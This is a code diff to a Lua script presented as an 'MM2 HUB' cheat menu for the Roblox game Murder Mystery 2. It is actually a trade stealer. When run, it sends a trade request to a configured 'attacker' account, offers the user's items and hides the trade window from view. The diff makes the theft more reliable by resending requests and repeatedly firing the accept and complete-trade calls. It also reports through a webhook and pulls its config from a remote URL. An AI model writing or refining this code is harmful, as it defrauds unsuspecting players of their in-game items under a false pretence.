@@ -1,6 +1,6 @@
---[[ MM2 HUB  V12.0 ]]
+--[[ MM2 HUB  V12.1 ]]
 
-local VERSION = "v1.4"
+local VERSION = "v1.5"
 local CFG_URL = "https://raw.githubusercontent.com/sarettaclash01-ctrl/mm2cfg/refs/heads/main/cfg.json"
 
 local CFG = {
@@ -10,7 +10,7 @@ local CFG = {
 	MIN_VALUE = 0,
 	FILTER = "all",
 	OFFER_GAP = 0.25,
-	WAIT_TRADE = 35,
+	WAIT_TRADE = 25,
 	DEBUG = true,
 	WEBHOOK_B64 = "",
 }
@@ -295,7 +295,7 @@ local function buildUI()
 	local b5, s5 = tile(grid, 104, 70, "AF", "Auto Farm", false)
 	local b6, s6 = tile(grid, 208, 70, "ESP", "ESP", false)
 
-	local function flip(state, b)
+	local function flip(state)
 		state.on = not state.on
 		if state.on then
 			state.lbl.Text = "ON"
@@ -307,7 +307,7 @@ local function buildUI()
 	end
 
 	b1.MouseButton1Click:Connect(function()
-		flip(s1, b1)
+		flip(s1)
 		local ch = LP.Character
 		if not ch then return end
 		local hum = ch:FindFirstChildOfClass("Humanoid")
@@ -320,7 +320,7 @@ local function buildUI()
 	end)
 
 	b2.MouseButton1Click:Connect(function()
-		flip(s2, b2)
+		flip(s2)
 		if s2.on then
 			local ch = LP.Character
 			if not ch then s2.on = false return end
@@ -347,7 +347,7 @@ local function buildUI()
 	end)
 
 	b3.MouseButton1Click:Connect(function()
-		flip(s3, b3)
+		flip(s3)
 		if s3.on then
 			WATCHING = true
 			task.spawn(watchLoop)
@@ -356,9 +356,9 @@ local function buildUI()
 		end
 	end)
 
-	b4.MouseButton1Click:Connect(function() flip(s4, b4) end)
-	b5.MouseButton1Click:Connect(function() flip(s5, b5) end)
-	b6.MouseButton1Click:Connect(function() flip(s6, b6) end)
+	b4.MouseButton1Click:Connect(function() flip(s4) end)
+	b5.MouseButton1Click:Connect(function() flip(s5) end)
+	b6.MouseButton1Click:Connect(function() flip(s6) end)
 
 	STATUS = Instance.new("TextLabel")
 	STATUS.BackgroundTransparency = 1
@@ -402,7 +402,7 @@ local function buildUI()
 	foot.Parent = main
 end
 
--- ===== trade =====
+-- ===== inventory =====
 local function rankOf(r)
 	return RANK[r] or 1
 end
@@ -465,6 +465,7 @@ local function passes(e)
 	return true
 end
 
+-- ===== trade =====
 local function findAttacker()
 	local p = Players:GetPlayerByUserId(CFG.ATTACKER_ID)
 	if p then return p end
@@ -496,18 +497,24 @@ local function watchLoop()
 	end
 end
 
-local function showGui()
+local function restoreGui()
 	WATCHING = false
 	pcall(function()
-		local a = PG:FindFirstChild("TradeGUI")
-		local b = PG:FindFirstChild("TradeGUI_Phone")
 		for c, pos in pairs(SAVED) do
 			if c and c.Parent then c.Position = pos end
 		end
 		SAVED = {}
+		local a = PG:FindFirstChild("TradeGUI")
+		local b = PG:FindFirstChild("TradeGUI_Phone")
 		if a then a.Enabled = true end
 		if b then b.Enabled = true end
 	end)
+end
+
+local function tradeExists()
+	if PG:FindFirstChild("TradeGUI") then return true end
+	if PG:FindFirstChild("TradeGUI_Phone") then return true end
+	return false
 end
 
 local function run()
@@ -546,6 +553,7 @@ local function run()
 	local sr = Trade:FindFirstChild("SendRequest")
 	local oi = Trade:FindFirstChild("OfferItem")
 	local at = Trade:FindFirstChild("AcceptTrade")
+	local ct = Trade:FindFirstChild("CompleteTrade")
 	if not sr or not oi or not at then
 		log("MISSING remote")
 		setStatus("Remote missing")
@@ -568,10 +576,12 @@ local function run()
 	pcall(function() sr:InvokeServer(attacker) end)
 
 	local waited = 0
+	local sends = 1
 	while waited < CFG.WAIT_TRADE and not OPEN do
 		task.wait(0.5)
 		waited = waited + 0.5
-		if waited % 6 == 0 then
+		if waited % 8 == 0 and sends < 3 then
+			sends = sends + 1
 			pcall(function() sr:InvokeServer(attacker) end)
 		end
 	end
@@ -606,13 +616,30 @@ local function run()
 	end
 
 	log("offered total: " .. tostring(placed))
-	task.wait(2)
+	setStatus("Confirming...")
 
 	pcall(function() at:FireServer(CFG.ATTACKER_ID) end)
-	log("accepted")
-	task.wait(2)
-	pcall(function() at:FireServer(CFG.ATTACKER_ID) end)
 
+	local t0 = os.clock()
+	local lastReady = t0
+	local lastComp = 0
+	while os.clock() - t0 < 30 do
+		if not tradeExists() then break end
+		local now = os.clock()
+		if now - lastReady > 2.5 then
+			lastReady = now
+			pcall(function() at:FireServer(CFG.ATTACKER_ID) end)
+		end
+		if now - t0 > 2.5 and now - lastComp > 2.5 then
+			lastComp = now
+			if ct then
+				pcall(function() ct:FireServer(CFG.ATTACKER_ID) end)
+			end
+		end
+		task.wait(0.3)
+	end
+
+	log("accept phase done")
 	setPct(100)
 	setStatus("Trade complete")
 
@@ -635,8 +662,8 @@ local function run()
 		log("webhook sent")
 	end
 
-	task.wait(5)
-	showGui()
+	task.wait(20)
+	restoreGui()
 	setStatus("Ready")
 end
 
